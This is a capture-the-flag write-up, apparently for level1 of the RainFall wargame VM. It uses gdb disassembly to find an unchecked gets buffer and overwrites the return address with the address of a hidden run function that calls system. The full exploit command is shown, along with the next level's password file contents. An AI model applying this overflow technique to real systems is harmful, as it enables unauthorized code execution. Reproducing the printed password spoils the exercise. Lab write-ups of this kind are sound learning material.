using gdb:
when we check the functions:

---------------------------
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb)
---------------------------

we notice that we mainly have two functions main and run
now after disass main:

---------------------------
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:		push   ebp
   0x08048481 <+1>:		mov    ebp,esp
   0x08048483 <+3>:		and    esp,0xfffffff0
   0x08048486 <+6>:		sub    esp,0x50
   0x08048489 <+9>:		lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb)
---------------------------

we see that the main is setting space of 0x50(80) in the stack setting a variable for gets
with a buffer of 80 and not protecting it .. and from this we can obviously already see the
buffer overflow
and the main is not calling run function

et's check the run function:

---------------------------
(gdb) disassemble run
Dump of assembler code for function run:
   0x08048444 <+0>:		push   ebp
   0x08048445 <+1>:		mov    ebp,esp
   0x08048447 <+3>:		sub    esp,0x18
   0x0804844a <+6>:		mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
(gdb)
---------------------------

as we see the run functions is calling the system function

so we need to domehow make the main function call the run function

after using various tries on the program i found exactly the buffer in
76 character

---------------------------
cat <(python -c 'print "c" * 76')  | ./level1
Illegal instruction (core dumped)
level1@RainFall:~$
---------------------------

so that's where we need to inject the addressof run
let's get the address of run first:

---------------------------
(gdb) x run
0x8048444 <run>:	0x83e58955
(gdb)
---------------------------

so address of run is 0x8048444

now let's try to inject it after the 76 offset


---------------------------
level1@RainFall:~$ cat <(python -c 'print "c" * 76 + "\x08\x04\x84\x44"[::-1]') | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$
---------------------------
PS : \x08\x04\x84\x44 is the endian way to write 0x8048444 that's how the vm machine works

wait what? why is the segfault is preventing us from getting our shell

so after looking we nedd a tiny trick to prevent the program from going out and segfault

---------------------------
cat <(python -c 'print "c" * 76 + "\x08\x04\x84\x44"[::-1]') - | ./level1
Good... Wait what?

---------------------------

and that's what it is adding "-" to cat prevent the program from stopping


---------------------------
level1@RainFall:~$ cat <(python -c 'print "c" * 76 + "\x08\x04\x84\x44"[::-1]') - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
---------------------------

lwt's move to the other exercice
